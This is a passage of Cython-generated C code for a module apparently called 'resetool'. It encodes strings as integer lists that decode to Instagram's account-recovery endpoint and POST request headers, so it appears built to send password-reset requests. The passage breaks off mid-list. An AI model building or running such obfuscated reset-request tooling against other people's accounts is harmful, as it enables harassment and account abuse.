  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_8resetool_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_6source_8resetool_1__init__ = {"__init__", (PyCFunction)__pyx_pw_6source_8resetool_1__init__, METH_O, 0};
static PyObject *__pyx_pw_6source_8resetool_1__init__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__init__ (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_8resetool___init__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_8resetool___init__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__init__", 0);

  
  __pyx_t_1 = PyList_New(73); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_58);
  __Pyx_GIVEREF(__pyx_int_58);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_58);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 6, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 7, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_1, 8, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_1, 9, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_1, 10, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_1, 11, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_1, 12, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_1, 13, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_1, 14, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_1, 15, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_1, 16, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_1, 17, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_1, 18, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_1, 19, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_1, 20, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_1, 21, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_1, 22, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_1, 23, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_1, 24, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 25, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_1, 26, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_1, 27, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_1, 28, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 29, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_118);
  __Pyx_GIVEREF(__pyx_int_118);
  PyList_SET_ITEM(__pyx_t_1, 30, __pyx_int_118);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_1, 31, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 32, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_1, 33, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_1, 34, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_1, 35, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 36, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_1, 37, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_1, 38, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_1, 39, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_1, 40, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_1, 41, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_1, 42, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_1, 43, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_1, 44, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 45, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_1, 46, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_1, 47, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_1, 48, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_1, 49, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_1, 50, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_1, 51, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_1, 52, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_1, 53, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_1, 54, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_1, 55, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_1, 56, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_1, 57, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_118);
  __Pyx_GIVEREF(__pyx_int_118);
  PyList_SET_ITEM(__pyx_t_1, 58, __pyx_int_118);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_1, 59, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_1, 60, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_1, 61, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_1, 62, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_1, 63, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_1, 64, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_1, 65, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_1, 66, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_1, 67, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_1, 68, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_106);
  __Pyx_GIVEREF(__pyx_int_106);
  PyList_SET_ITEM(__pyx_t_1, 69, __pyx_int_106);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_1, 70, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_120);
  __Pyx_GIVEREF(__pyx_int_120);
  PyList_SET_ITEM(__pyx_t_1, 71, __pyx_int_120);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_1, 72, __pyx_int_47);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_url, __pyx_t_1) < 0) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(24); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = PyList_New(9); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_121);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(17); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_46);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 15, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_3, 16, __pyx_int_109);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_2, __pyx_t_3) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_109);
  __Pyx_GIVEREF(__pyx_int_109);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_109);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_100);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_80);
  __Pyx_GIVEREF(__pyx_int_80);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_80);
  __Pyx_INCREF(__pyx_int_79);
  __Pyx_GIVEREF(__pyx_int_79);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_79);
  __Pyx_INCREF(__pyx_int_83);
  __Pyx_GIVEREF(__pyx_int_83);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_83);
  __Pyx_INCREF(__pyx_int_84);
  __Pyx_GIVEREF(__pyx_int_84);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_84);
  __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_4, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (PyDict_SetItem(__pyx_t_1, __pyx_t_3, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_104);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = PyList_New(48); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 1, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_3, 2, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_3, 3, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 4, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_118);
  __Pyx_GIVEREF(__pyx_int_118);
  PyList_SET_ITEM(__pyx_t_3, 5, __pyx_int_118);
  __Pyx_INCREF(__pyx_int_49);
  __Pyx_GIVEREF(__pyx_int_49);
  PyList_SET_ITEM(__pyx_t_3, 6, __pyx_int_49);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 7, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_119);
  __Pyx_GIVEREF(__pyx_int_119);
  PyList_SET_ITEM(__pyx_t_3, 8, __pyx_int_119);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_3, 9, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_3, 10, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 11, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 12, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 13, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 14, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 15, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_3, 16, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_3, 17, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_3, 18, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_3, 19, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_3, 20, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_97);
  __Pyx_GIVEREF(__pyx_int_97);
  PyList_SET_ITEM(__pyx_t_3, 21, __pyx_int_97);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 22, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_3, 23, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_3, 24, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_3, 25, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
